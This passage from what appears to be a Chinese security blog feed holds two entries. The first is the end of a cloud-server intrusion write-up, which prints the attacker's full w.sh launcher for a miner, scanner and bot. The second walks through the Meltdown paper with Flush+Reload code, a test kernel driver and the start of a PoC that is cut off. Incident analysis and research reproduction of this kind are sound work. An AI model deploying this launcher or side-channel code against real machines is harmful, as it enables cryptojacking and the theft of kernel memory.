/></p><p>这里关于Ubuntu的ssh配置又有一点不一样，可以参考 <a href="https://www.cnblogs.com/xiao987334176/p/18806530">https://www.cnblogs.com/xiao987334176/p/18806530</a> 。<strong>Ubuntu 24.04.2，除了修改默认的ssh配置文件之外，还需要修改SSH Socket配置。</strong></p><h2 id="bash-history"><a class="markdownIt-Anchor" href="#bash-history"></a> Bash History</h2><p><img src="D:%5CHacktools%5CActions%5CplayCT%5Cassets%5Cimage-20251114162100633.png" alt="image-20251114162100633" /></p><p>已经被攻击者清空了</p><h1 id="攻击者相关"><a class="markdownIt-Anchor" href="#攻击者相关"></a> 攻击者相关</h1><p>攻击者登录IP：5.181.37.35</p><p><img src="D:%5CHacktools%5CActions%5CplayCT%5Cassets%5Cimage-20251114160542097.png" alt="image-20251114160542097" /></p><p><a href="https://x.threatbook.com/v5/ip/5.181.37.35">https://x.threatbook.com/v5/ip/5.181.37.35</a></p><p><img src="D:%5CHacktools%5CActions%5CplayCT%5Cassets%5Cimage-20251114160737602.png" alt="image-20251114160737602" /></p><p><a href="https://www.virustotal.com/gui/file/1963fdaa0ffd3f6b4f9b4568a2e43f0c62b3a77657ece6559c9af229d0842c6f">https://www.virustotal.com/gui/file/1963fdaa0ffd3f6b4f9b4568a2e43f0c62b3a77657ece6559c9af229d0842c6f</a></p><p><img src="D:%5CHacktools%5CActions%5CplayCT%5Cassets%5Cimage-20251114163148973.png" alt="image-20251114163148973" /></p><p><code>w.sh</code>详细内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="built_in">set</span> -euo pipefail</span><br><span class="line"></span><br><span class="line">DIR=<span class="string">&quot;<span class="subst">$(cd -- <span class="string">&quot;<span class="subst">$(dirname -- <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>&quot;</span> &amp;&amp; pwd)</span>&quot;</span></span><br><span class="line">SCAN_NAME=<span class="string">&quot;<span class="variable">$&#123;1:-scanfile&#125;</span>&quot;</span></span><br><span class="line">MINER_NAME=<span class="string">&quot;<span class="variable">$&#123;2:-minefile&#125;</span>&quot;</span></span><br><span class="line">BOT_NAME=<span class="string">&quot;<span class="variable">$&#123;3:-botfile&#125;</span>&quot;</span></span><br><span class="line">SCAN_ARGS=<span class="string">&quot;<span class="variable">$&#123;4:-&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">SCAN=<span class="string">&quot;<span class="variable">$DIR</span>/<span class="variable">$SCAN_NAME</span>&quot;</span></span><br><span class="line">MINER=<span class="string">&quot;<span class="variable">$DIR</span>/<span class="variable">$MINER_NAME</span>&quot;</span></span><br><span class="line">BOT=<span class="string">&quot;<span class="variable">$DIR</span>/<span class="variable">$BOT_NAME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># normalize arch</span></span><br><span class="line"><span class="built_in">arch</span>=<span class="string">&quot;<span class="subst">$(uname -m || true)</span>&quot;</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$arch</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">  x86_64|amd64) <span class="built_in">arch</span>=<span class="string">&quot;amd64&quot;</span> ;;</span><br><span class="line">  aarch64) <span class="built_in">arch</span>=<span class="string">&quot;arm64&quot;</span> ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cores</span></span><br><span class="line">cores=<span class="string">&quot;<span class="subst">$(nproc 2&gt;/dev/null || echo 1)</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$cores</span>&quot;</span> ]; <span class="keyword">then</span> cores=1; <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># helper: start if not running</span></span><br><span class="line"><span class="function"><span class="title">start_bg</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> bin=<span class="string">&quot;<span class="variable">$1</span>&quot;</span>; <span class="built_in">shift</span></span><br><span class="line">  <span class="built_in">local</span> args=(<span class="string">&quot;<span class="variable">$@</span>&quot;</span>)</span><br><span class="line">  [ -x <span class="string">&quot;<span class="variable">$bin</span>&quot;</span> ] || <span class="built_in">chmod</span> +x <span class="string">&quot;<span class="variable">$bin</span>&quot;</span> 2&gt;/dev/null || <span class="literal">true</span></span><br><span class="line">  <span class="keyword">if</span> ! pgrep -f -- <span class="string">&quot;<span class="variable">$bin</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1; <span class="keyword">then</span></span><br><span class="line">    <span class="string">&quot;<span class="variable">$bin</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;args[@]&#125;</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># helper: stop if running</span></span><br><span class="line"><span class="function"><span class="title">stop_if_running</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> bin=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  pgrep -f -- <span class="string">&quot;<span class="variable">$bin</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 0</span><br><span class="line">  pkill -f -- <span class="string">&quot;<span class="variable">$bin</span>&quot;</span> || <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># DECIZIE: miner-only vs scan+bot</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$arch</span>&quot;</span> = <span class="string">&quot;amd64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$cores</span>&quot;</span> -ge 4 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># miner only</span></span><br><span class="line">    [ -x <span class="string">&quot;<span class="variable">$MINER</span>&quot;</span> ] || <span class="built_in">exit</span> 0</span><br><span class="line">    start_bg <span class="string">&quot;<span class="variable">$MINER</span>&quot;</span></span><br><span class="line">    stop_if_running <span class="string">&quot;<span class="variable">$SCAN</span>&quot;</span></span><br><span class="line">    stop_if_running <span class="string">&quot;<span class="variable">$BOT</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment"># amd64 &amp; &lt;4 cores -&gt; doar scan</span></span><br><span class="line">    <span class="keyword">if</span> [ -x <span class="string">&quot;<span class="variable">$SCAN</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      start_bg <span class="string">&quot;<span class="variable">$SCAN</span>&quot;</span> <span class="variable">$SCAN_ARGS</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    stop_if_running <span class="string">&quot;<span class="variable">$MINER</span>&quot;</span></span><br><span class="line">    stop_if_running <span class="string">&quot;<span class="variable">$BOT</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="comment"># non-amd64 -&gt; scan + bot</span></span><br><span class="line">  <span class="keyword">if</span> [ -x <span class="string">&quot;<span class="variable">$SCAN</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    start_bg <span class="string">&quot;<span class="variable">$SCAN</span>&quot;</span> <span class="variable">$SCAN_ARGS</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -x <span class="string">&quot;<span class="variable">$BOT</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    start_bg <span class="string">&quot;<span class="variable">$BOT</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  stop_if_running <span class="string">&quot;<span class="variable">$MINER</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h1 id="后续处理"><a class="markdownIt-Anchor" href="#后续处理"></a> 后续处理</h1><p>还好没有涉及任何数据，而且是刚买的服务器，基本上没内容，一般来说重装就行了。如果想更多了解可以仿照</p><p><a href="https://www.cnblogs.com/zaan/p/18225628">https://www.cnblogs.com/zaan/p/18225628</a> 的内容，这里的行为特征和这个文章高度符合。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;腾讯云默认云服务器SSH配置引发的“血案”&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>CPU Meltdown 漏洞与论文</title>
    <link href="https://joe1sn.eu.org/2025/10/14/meltdown/"/>
    <id>https://joe1sn.eu.org/2025/10/14/meltdown/</id>
    <published>2025-10-14T09:11:10.000Z</published>
    <updated>2025-10-14T09:17:31.016Z</updated>
    
    <content type="html"><![CDATA[<p>公众号：<a href="https://mp.weixin.qq.com/s/VsGaZ7LqFkziJRpxp0rEBQ">https://mp.weixin.qq.com/s/VsGaZ7LqFkziJRpxp0rEBQ</a></p><p>很经典一篇同时具有实践价值和学术研究价值的文章，原文名称：Meltdown: Reading Kernel Memory from User Space [1]。<strong>提前预告：由于没有找到合适的CPU所以复现是失败的</strong></p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsa0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="复现cpu-meltdown-漏洞与论文"><a class="markdownIt-Anchor" href="#复现cpu-meltdown-漏洞与论文"></a> [复现]CPU Meltdown 漏洞与论文</h1><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929204523923.png" alt="image-20250929204523923" /></p><p>很经典一篇同时具有实践价值和学术研究价值的文章，原文名称：Meltdown: Reading Kernel Memory from User Space [1]。<strong>提前预告：由于没有找到合适的CPU所以复现是失败的</strong></p><h1 id="摘要"><a class="markdownIt-Anchor" href="#摘要"></a> 摘要</h1><p>​写过论文都知道这部分就是对文章大概的描述，很关键的是这句</p><blockquote><p>“Meltdown  exploits side effects of out-of-order execution on modern processors to read arbitrary kernel-memory locations  including personal data and passwords.”</p><p>Meltdown利用现代处理器乱序执行的副作用来读取包括个人数据和密码在内的任意内核内存位置。</p></blockquote><blockquote><p>The attack  is independent of the operating system, and it does not  rely on any software vulnerabilities.</p><p>该攻击与操作系统无关，不依赖于任何软件漏洞。</p></blockquote><h1 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h1><p>​这部分首先简单讲述了计算机系统中的用户态内存和内核内存的<strong>分离机制</strong>，根据Intel的手册来说是 多层页表映射结构体中的U/S位决定的。还有从内核到用户的<strong>内存映射机制</strong></p><blockquote><p>Operating systems ensure that user  programs cannot access each other’s memory or kernel  memory. This isolation is a cornerstone of our computing  environments and allows running multiple applications at  the same time on personal devices or executing processes  of multiple users on a single machine in the cloud.</p><p>操作系统保证用户程序不能访问彼此的内存或内核内存。这种隔离是我们计算环境的基石，允许在个人设备上同时运行多个应用程序，或者在云中的一台机器上运行多个用户的执行过程。</p><p>This hardware feature allows operating systems to map  the kernel into the address space of every process and  to have very efficient transitions from the user process  to the kernel,</p><p>这种硬件特性允许操作系统将内核映射到每个进程的地址空间，并且从用户进程到内核有非常高效的转换。</p></blockquote><p>​接着描述了影响</p><blockquote><p>Instead, Meltdown exploits side-channel information available on most modern processors</p><p>相反，Meltdown利用了在大多数现代处理器上可用的侧信道信息。</p></blockquote><p>​接着引出罪魁祸首</p><blockquote><p>The root cause of the simplicity and strength of Meltdown are side effects caused by out-of-order execution. Out-of-order execution is an important performance  feature of today’s processors in order to overcome latencies of busy execution units, e.g., a memory fetch unit  needs to wait for data arrival from memory.</p><p>Meltdown的简单性和强大性的根本原因是乱序执行导致的副作用。乱序执行是当今处理器的一个重要性能特征，为了克服繁忙执行单元的延迟，例如，一个内存获取单元需要等待来自内存的数据到达。</p></blockquote><p>​可能没有了解过计算机组成原理的人认为我们的CPU是按照顺序去一行一行执行代码的，但事实并非如此。CPU为了加快运算并且避免长时间的等待，比如当CPU面临一个<code>if</code>分支的情况时，他会预测走向哪条分支，然后提前运行代码，这样当<code>if</code>条件判断结束后就不用再执行这部分代码了。不过分支预测错误就会造成性能损耗，因为CPU可能会执行错误的分支，然后再执行正确的分支，这个就是错误惩罚。这里我第一次是从《深入理解计算机系统》（CSAPP）这本书中认识的，这一段便于我们理解后续的漏洞。</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929210041739.png" alt="image-20250929210041739" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929210224450.png" alt="image-20250929210224450" /></p><p>​接着点明</p><blockquote><p>one observation is particularly significant: vulnerable out-of-order CPUs allow  an unprivileged process to load data from a privileged  (kernel or physical) address into a temporary CPU register.</p><p>一个特别重要的观察是：易受攻击的乱序CPU允许非特权进程将数据从特权的(内核或物理)地址加载到临时的CPU寄存器中。</p></blockquote><p>​为什么呢？因为在分支预测中，CPU会将操作完成后的结果放入缓存（Cache）中，他不管数据来自哪里、有什么权限，只是操作系统会限制我们进行读写。</p><p>​然后提到了对于利用比较重要的例子：刷新后重载。这个会在我们的后文中进行一个小例子的实验。</p><blockquote><p>As a result, an  attacker can dump the entire kernel memory by reading  privileged memory in an out-of-order execution stream,  and transmit the data from this elusive state via a microarchitectural covert channel (e.g., Flush+Reload)</p><p>因此，攻击者可以通过读取乱序执行流中的特权内存来转储整个内核内存，并通过微体系结构隐蔽通道(例如 刷新+重载 )从这种难以捉摸的状态中传输数据。</p></blockquote><h1 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h1><p>首先讲了乱序执行，举了 <code>Intel SkyLake</code> 架构的示例</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929210852511.png" alt="image-20250929210852511" /></p><blockquote><p>Figure 1: Simplified illustration of a single core of the Intel’s Skylake microarchitecture. Instructions are decoded  into μOPs and executed out-of-order in the execution engine by individual execution units.</p><p>图1为英特尔Skylake微体系结构单个内核的简化示意图。指令被解码为μOPs，并由各个执行单元在执行引擎中乱序执行。</p></blockquote><p>然后比较详细的讲述了内存映射机制和针对缓存的攻击，基本就是导读中的详细讲述。</p><p>一般程序中用户态的内存映射到低地址（0x0~0x7FFFFFFFFFFF），内核则处于高地址，这样进行系统调用的时候就不会切换页表，CPU缓存也不会失效。</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929213042509.png" alt="image-20250929213042509" /></p><blockquote><p>Figure 2: The physical memory is directly mapped in the  kernel at a certain offset. A physical address (blue) which  is mapped accessible to the user space is also mapped in  the kernel space through the direct mapping.</p><p>图2：物理内存以一定的偏移量直接映射在内核中。一个映射到用户空间可访问的物理地址(蓝色)也通过直接映射映射到内核空间。</p></blockquote><h1 id="玩具化的例子"><a class="markdownIt-Anchor" href="#玩具化的例子"></a> 玩具化的例子</h1><p>主要还是 Flush+Reload 方法。这里开始上我们的代码</p><p>论文中使用的是一个异常捕获的例子</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929212553622.png" alt="image-20250929212553622" /></p><p>这里有一个简短的代码[3]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;excpt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> probeArray[<span class="number">256</span>][<span class="number">4096</span>] = &#123;&#125;;</span><br><span class="line"><span class="type">uint64_t</span> accessTime[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> secret = <span class="number">66</span>;</span><br><span class="line">    <span class="type">uint8_t</span> *p = &amp;secret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        _mm_clflush(&amp;probeArray[i]);</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">uint32_t</span> *)<span class="literal">NULL</span> = <span class="number">0</span>;</span><br><span class="line">        probeArray[*p][<span class="number">0</span>]++;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> aux;</span><br><span class="line">        <span class="type">uint64_t</span> a = __rdtscp(&amp;aux);</span><br><span class="line">        probeArray[i][<span class="number">0</span>]++;</span><br><span class="line">        <span class="type">uint64_t</span> b = __rdtscp(&amp;aux);</span><br><span class="line">        accessTime[i] = b - a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%llu,&quot;</span>, accessTime[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先定义了一块 <code>probeArray</code> 缓存，每一行多出的 4096 是为了让CPU可以充分缓存其他值</p><p>使用<code>_mm_clflush</code>刷新缓存，让缓存失效</p><p>接着</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">uint32_t</span> *)<span class="literal">NULL</span> = <span class="number">0</span>;</span><br><span class="line">    probeArray[*p][<span class="number">0</span>]++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​空指针引用可能会让缓存失效，但是CPU乱序执行仍然可能执行到<code>probeArray[*p][0]++;</code>。<code>*p</code>指向的是<code>secret</code>地址，然后再数组访问中还原成了<code>secret</code>的值，也就是让<code>probeArray</code>的第<code>secret</code>行的首个uint8值加一。</p><p>​CPU意识到这一行不应被执行时，会让<code>probeArray</code>中的数据恢复，但是缓存依旧存在！接着我们记录读取<code>probeArray</code>中保存的数据的时间，但是第<code>secret</code>行的缓存存在，所以理论上他会比其他的缓存访问更快。</p><p>​**注意：**这里仅适用于2018年前生产CPU，比如我在Ryzen9+win11上就无法测出</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250929224030421.png" alt="image-20250929224030421" /></p><p>但是在我的老i5 虚拟机+物理机就可以</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929224617733.png" alt="image-20250929224617733" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250929224644844.png" alt="image-20250929224644844" /></p><p>这里可以看到访问第66块内存的时间是最少的，这也符合论文中的结论</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250929225002468.png" alt="image-20250929225002468" /></p><blockquote><p>图4：即使一个内存位置只在乱序执行时被访问，它仍然被缓存。在256页的探测数组上迭代显示一个缓存命中，恰好在乱序执行期间访问的页面上。</p></blockquote><p><strong>如果我们把<code>P</code>指针换做内核态的地址那就很有可能读取到内核内存了，这也是meltdown中将CPU微指令架构转为为可观察的一个技巧</strong></p><h1 id="meltdown"><a class="markdownIt-Anchor" href="#meltdown"></a> Meltdown</h1><h2 id="编写测试用例"><a class="markdownIt-Anchor" href="#编写测试用例"></a> 编写测试用例</h2><p>首先假设我们有这样一块内核驱动，来源是[3]：<a href="https://github.com/dulong-lab/video-virtual-memory-materials">https://github.com/dulong-lab/video-virtual-memory-materials</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(RegistryPath);</span><br><span class="line"></span><br><span class="line">    DbgPrint(<span class="string">&quot;Test with Driver: %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line">    Secret = ExAllocatePool2(POOL_FLAG_NON_PAGED, <span class="number">4096</span>, <span class="string">&#x27;melt&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!Secret) <span class="keyword">return</span> STATUS_MEMORY_NOT_ALLOCATED;</span><br><span class="line"></span><br><span class="line">    wcscpy(Secret, SecretData);</span><br><span class="line"></span><br><span class="line">    NTSTATUS Status = PsCreateSystemThread(&amp;ThreadHandle,</span><br><span class="line">        <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">        StartRoutine, <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        ExFreePool(Secret);</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DbgPrint(<span class="string">&quot;Secret @ %p\n&quot;</span>, Secret);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请了一开<code>NonPagePool</code>然后将机密的值<code>Secret</code>复制给他。为了方便攻击的进行，开启了一个内核线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line"><span class="title function_">StartRoutine</span><span class="params">(PVOID StartContext)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(StartContext);</span><br><span class="line"></span><br><span class="line">    KeSetSystemAffinityThread(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    UINT32 Junk = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> SecretLength = wcslen(Secret);</span><br><span class="line">    LARGE_INTEGER Inteval = &#123; .QuadPart = <span class="number">-10000</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!ThreadStopFlag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; SecretLength; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Junk ^= Secret[i];</span><br><span class="line">            Junk++;</span><br><span class="line">            KeDelayExecutionThread(KernelMode, FALSE, &amp;Inteval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PsTerminateSystemThread(STATUS_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>KeSetSystemAffinityThread(1);</code>这段代码跑在第一块核心上，理论上可以使用到一级缓存，并且循环访问<code>secret</code>数据，这有利于我们的攻击</p><p>最后就是关闭线程并卸载驱动</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line"><span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    DbgPrint(<span class="string">&quot;driver unloaded %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    ThreadStopFlag = TRUE;</span><br><span class="line">    ZwWaitForSingleObject(ThreadHandle, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    ZwClose(ThreadHandle);</span><br><span class="line">    ExFreePool(Secret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploads274beedb4018dd06c39a7973fd9a4003.jpg" alt="274beedb4018dd06c39a7973fd9a4003" /></p><h2 id="编写poc"><a class="markdownIt-Anchor" href="#编写poc"></a> 编写PoC</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;USAGE: meltdown target\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *target = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (sscanf_s(argv[<span 